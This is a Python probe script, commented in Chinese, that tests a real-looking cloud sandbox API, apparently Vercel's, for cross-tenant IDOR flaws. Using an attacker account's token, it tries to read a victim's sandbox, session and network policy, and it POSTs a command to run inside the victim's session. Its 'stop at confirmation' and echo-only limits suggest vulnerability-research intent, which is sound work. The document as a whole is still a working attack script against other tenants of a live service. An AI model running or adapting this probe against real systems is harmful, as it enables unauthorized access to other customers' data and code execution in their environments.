# -*- coding: utf-8 -*-
"""跨租户 IDOR 探测 (attacker = 主账号 token)
只读面验证: attacker token 能否访问 victim 的沙箱/会话/网络策略
规则: stop at confirmation - 任一 GET 命中 victim 资源即确认并停止, 不做写入/删除/枚举
用法: python idor_cross_driver.py <victim_sbx_name> <victim_sid>
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

victim_name = sys.argv[1]
victim_sid = sys.argv[2]

print('=== attacker 只读探测 victim 资源 ===', flush=True)

# 1) 按 name 查 victim 沙箱 (attacker team 上下文)
c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (victim_name, TEAM, PROJ))
print('T1 GET sandbox by name (attacker team): %d %s' % (c, r[:300]), flush=True)
if c == 200:
    print('!!! CONFIRMED: attacker 可读 victim 沙箱 (by name)', flush=True)

# 2) 直接查 victim session
c, r = api('GET', '/v2/sandboxes/sessions/%s?teamId=%s' % (victim_sid, TEAM))
print('T2 GET victim session (attacker team): %d %s' % (c, r[:300]), flush=True)
if c == 200:
    print('!!! CONFIRMED: attacker 可读 victim session', flush=True)

# 3) victim session 的 network-policy
c, r = api('GET', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (victim_sid, TEAM))
print('T3 GET victim network-policy: %d %s' % (c, r[:300]), flush=True)
if c == 200:
    print('!!! CONFIRMED: attacker 可读 victim 网络策略', flush=True)

# 4) victim session 执行只读 cmd (仅 echo, 不读写 victim 数据)
c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (victim_sid, TEAM),
           {'command': 'echo', 'args': ['cross-tenant-check'], 'wait': True, 'timeout': 30000})
print('T4 POST cmd to victim session: %d %s' % (c, r[:300]), flush=True)
if c == 200:
    print('!!! CONFIRMED: attacker 可在 victim 沙箱执行命令', flush=True)

# 5) 不带 teamId 尝试 (默认团队上下文)
c, r = api('GET', '/v2/sandboxes/%s' % victim_name)
print('T5 GET sandbox by name (no team): %d %s' % (c, r[:300]), flush=True)

print('=== DONE (stop at confirmation) ===', flush=True)
